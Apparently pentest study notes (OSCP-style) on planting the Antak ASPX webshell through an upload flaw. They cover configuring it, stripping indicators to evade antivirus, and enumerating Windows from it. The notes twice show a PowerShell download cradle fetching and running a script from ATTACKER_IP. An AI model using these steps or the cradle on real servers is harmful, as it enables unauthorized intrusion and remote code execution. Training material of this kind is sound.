@@ -1,0 +1,387 @@
+# Antak Webshell (ASPX)
+
+## Overview
+
+**Antak** is an ASP.NET webshell included in the **Nishang** framework.
+
+It provides:
+
+- PowerShell execution via browser
+- file upload & download capability
+- command execution
+- script execution in memory
+- credential-protected web interface
+
+Antak is commonly used when:
+
+- exploiting Windows IIS servers
+- gaining RCE via file upload vulnerability
+- working with ASP.NET applications
+- needing PowerShell execution through web context
+
+---
+
+# 1. What is ASPX?
+
+**ASPX (Active Server Pages Extended)** is part of the Microsoft ASP.NET framework.
+
+Workflow:
+
+client request → ASP.NET processes server-side code → HTML returned to browser
+
+Because ASPX pages execute server-side code, they can be used to run:
+
+- PowerShell commands
+- Windows commands
+- scripts
+- payloads
+
+---
+
+# 2. What is Antak?
+
+Antak is a PowerShell-based ASPX webshell from the Nishang toolkit.
+
+Features:
+
+- browser-based command execution
+- PowerShell-themed interface
+- runs commands as separate processes
+- can encode commands
+- supports in-memory execution
+- upload and download functionality
+
+Useful for:
+
+- initial access persistence
+- post-exploitation command execution
+- staging payloads
+- enumerating Windows servers
+
+---
+
+# 3. Location of Antak
+
+On Kali / Pwnbox:
+
+```bash
+/usr/share/nishang/Antak-WebShell
+```
+
+---
+
+## List Files
+
+```bash
+ls /usr/share/nishang/Antak-WebShell
+```
+
+Output:
+
+```text
+antak.aspx
+Readme.md
+```
+
+---
+
+# 4. Prepare Antak for Upload
+
+## Copy shell to working directory
+
+```bash
+cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
+```
+
+Rename file if needed:
+
+```bash
+shell.aspx
+upload.aspx
+default.aspx
+status.aspx
+```
+
+Choose filename appropriate for target environment.
+
+---
+
+# 5. Configure Credentials
+
+Edit the ASPX file.
+
+Example:
+
+```bash
+nano Upload.aspx
+```
+
+Modify credentials inside file.
+
+Typically around line 14.
+
+Change:
+
+```csharp
+Username
+Password
+```
+
+Set:
+
+```text
+user = chosen username
+pass = chosen password
+```
+
+Purpose:
+
+prevent unauthorized access to shell.
+
+---
+
+## OPSEC Consideration
+
+Consider removing:
+
+- ASCII art
+- comments
+- obvious indicators
+
+These may trigger:
+
+- AV signatures
+- file scanning alerts
+- manual detection
+
+---
+
+# 6. Upload Webshell
+
+Upload using available vector:
+
+- file upload functionality
+- vulnerable CMS
+- unrestricted file upload flaw
+- misconfigured IIS directory
+- WebDAV upload
+- LFI to RCE chains
+
+Example target directory:
+
+```text
+/files/
+```
+
+---
+
+# 7. Accessing the Shell
+
+Navigate to uploaded file in browser:
+
+```text
+http://target/files/upload.aspx
+```
+
+Login page should appear.
+
+Enter configured credentials.
+
+---
+
+# 8. Using Antak
+
+Antak behaves similar to PowerShell console.
+
+Commands execute via PowerShell backend.
+
+---
+
+## Basic Commands
+
+```powershell
+whoami
+hostname
+pwd
+dir
+cd C:\Users
+ipconfig
+systeminfo
+```
+
+---
+
+## Enumerate Environment
+
+```powershell
+whoami /priv
+whoami /groups
+net users
+net localgroup administrators
+```
+
+---
+
+## File System Navigation
+
+```powershell
+dir
+cd
+type file.txt
+copy
+move
+del
+```
+
+---
+
+## Execute Scripts in Memory
+
+PowerShell download cradle example:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/script.ps1")
+```
+
+---
+
+## Upload Files via Interface
+
+Antak UI includes upload functionality.
+
+Useful for:
+
+- payload staging
+- script transfer
+- privilege escalation tools
+
+Examples:
+
+```text
+winPEAS
+PowerView
+SharpHound
+Seatbelt
+custom scripts
+```
+
+---
+
+# 9. Command Help
+
+Inside shell:
+
+```powershell
+help
+```
+
+Provides available functionality.
+
+---
+
+# 10. Typical Workflow
+
+1. identify upload vulnerability
+2. upload antak.aspx
+3. configure credentials
+4. access webshell
+5. enumerate system
+6. upload tools
+7. establish reverse shell if needed
+8. perform privilege escalation
+
+---
+
+# 11. Advantages of Antak
+
+- PowerShell native interaction
+- works well on IIS servers
+- credential protection supported
+- supports in-memory execution
+- useful pivot point for further exploitation
+
+---
+
+# 12. Limitations
+
+- each command runs as separate process
+- depends on PowerShell availability
+- requires ASP.NET enabled server
+- noisy if heavily used
+- visible in IIS logs
+
+---
+
+# Cheatsheet
+
+## Locate Antak
+
+```bash
+ls /usr/share/nishang/Antak-WebShell
+```
+
+---
+
+## Copy for editing
+
+```bash
+cp /usr/share/nishang/Antak-WebShell/antak.aspx shell.aspx
+```
+
+---
+
+## Edit credentials
+
+```bash
+nano shell.aspx
+```
+
+---
+
+## Upload shell
+
+Upload via vulnerable application.
+
+---
+
+## Access shell
+
+```text
+http://target/files/shell.aspx
+```
+
+---
+
+## Basic enumeration
+
+```powershell
+whoami
+hostname
+pwd
+dir
+systeminfo
+```
+
+---
+
+## Execute remote script
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/script.ps1")
+```
+
+---
+
+# Related Notes
+
+- IIS exploitation
+- file upload bypass techniques
+- PowerShell download cradles
+- reverse shells
+- Windows privilege escalation
+
+---
+
+# Tags
+
+#webshell #aspx #nishang #powershell #windows #iis #rce #oscp
